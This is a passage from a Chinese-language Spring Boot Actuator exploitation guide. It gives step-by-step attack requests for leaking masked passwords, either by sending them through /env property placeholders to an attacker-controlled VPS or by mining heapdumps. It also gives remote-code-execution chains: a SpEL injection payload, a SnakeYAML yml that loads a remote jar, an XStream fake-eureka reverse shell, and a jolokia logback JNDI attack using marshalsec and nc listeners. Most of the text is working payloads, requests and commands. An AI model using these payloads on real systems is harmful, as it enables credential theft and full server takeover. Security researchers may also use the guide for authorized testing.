<h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
<h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>  中的  <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>
<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>
<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>

<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
<h3 id="0x05：获取被星号脱敏的密码的明文-方法三"><a href="#0x05：获取被星号脱敏的密码的明文-方法三" class="headerlink" title="0x05：获取被星号脱敏的密码的明文 (方法三)"></a>0x05：获取被星号脱敏的密码的明文 (方法三)</h3><h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote>
<p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p>
</blockquote>
<h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
<h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul>
<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0x06：获取被星号脱敏的密码的明文-方法四"><a href="#0x06：获取被星号脱敏的密码的明文-方法四" class="headerlink" title="0x06：获取被星号脱敏的密码的明文 (方法四)"></a>0x06：获取被星号脱敏的密码的明文 (方法四)</h3><blockquote>
<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
</ul>
<h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-3"><a href="#步骤一：-找到想要获取的属性名-3" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
<h5 id="步骤二：-下载-jvm-heap-信息"><a href="#步骤二：-下载-jvm-heap-信息" class="headerlink" title="步骤二： 下载 jvm heap 信息"></a>步骤二： 下载 jvm heap 信息</h5><blockquote>
<p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>
<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
<h5 id="步骤三：-使用-MAT-获得-jvm-heap-中的密码明文"><a href="#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文" class="headerlink" title="步骤三： 使用 MAT 获得 jvm heap 中的密码明文"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>
<h2 id="二：远程代码执行"><a href="#二：远程代码执行" class="headerlink" title="二：远程代码执行"></a>二：远程代码执行</h2><blockquote>
<p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p>
</blockquote>
<h3 id="0x01：whitelabel-error-page-SpEL-RCE"><a href="#0x01：whitelabel-error-page-SpEL-RCE" class="headerlink" title="0x01：whitelabel error page SpEL RCE"></a>0x01：whitelabel error page SpEL RCE</h3><h4 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>
<h4 id="利用方法：-4"><a href="#利用方法：-4" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h5><p>比如发现访问  <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>
<h5 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h5><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
<p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>执行 <code>open -a Calculator</code> 命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
<h4 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository/springboot-spel-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9091&#x2F;article?id&#x3D;66</span><br></pre></td></tr></table></figure>

<p>执行 <code>open -a Calculator</code> 命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="0x02：spring-cloud-SnakeYAML-RCE"><a href="#0x02：spring-cloud-SnakeYAML-RCE" class="headerlink" title="0x02：spring cloud SnakeYAML RCE"></a>0x02：spring cloud SnakeYAML RCE</h3><h4 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<h4 id="利用方法：-5"><a href="#利用方法：-5" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在网站根目录下放置后缀为 <code>yml</code> 的文件  <code>example.yml</code>，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在网站根目录下放置后缀为 <code>jar</code> 的文件  <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>
<h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
<h4 id="漏洞环境：-1"><a href="#漏洞环境：-1" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository/springcloud-snakeyaml-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9092&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x03：eureka-xstream-deserialization-RCE"><a href="#0x03：eureka-xstream-deserialization-RCE" class="headerlink" title="0x03：eureka xstream deserialization RCE"></a>0x03：eureka xstream deserialization RCE</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<h4 id="利用方法：-6"><a href="#利用方法：-6" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
<h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
<h4 id="漏洞环境：-2"><a href="#漏洞环境：-2" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository/springboot-eureka-xstream-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9093&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x04：jolokia-logback-JNDI-RCE"><a href="#0x04：jolokia-logback-JNDI-RCE" class="headerlink" title="0x04：jolokia logback JNDI RCE"></a>0x04：jolokia logback JNDI RCE</h3><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
</li>
<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
</li>
<li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
</li>
<li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</p>
</li>
</ul>
<h4 id="利用方法：-7"><a href="#利用方法：-7" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
<h5 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="步骤三：准备要执行的-Java-代码"><a href="#步骤三：准备要执行的-Java-代码" class="headerlink" title="步骤三：准备要执行的 Java 代码"></a>步骤三：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
<p>使用兼容低版本 jdk 的方式编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>

<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<h5 id="步骤四：架设恶意-ldap-服务"><a href="#步骤四：架设恶意-ldap-服务" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>



<h5 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>



<h5 id="步骤六：从外部-URL-地址加载日志配置文件"><a href="#步骤六：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤六：从外部 URL 地址加载日志配置文件"></a>步骤六：从外部 URL 地址加载日志配置文件</h5><blockquote>
<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>
<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;your-vps-ip!&#x2F;example.xml</span><br></pre></td></tr></table></figure>



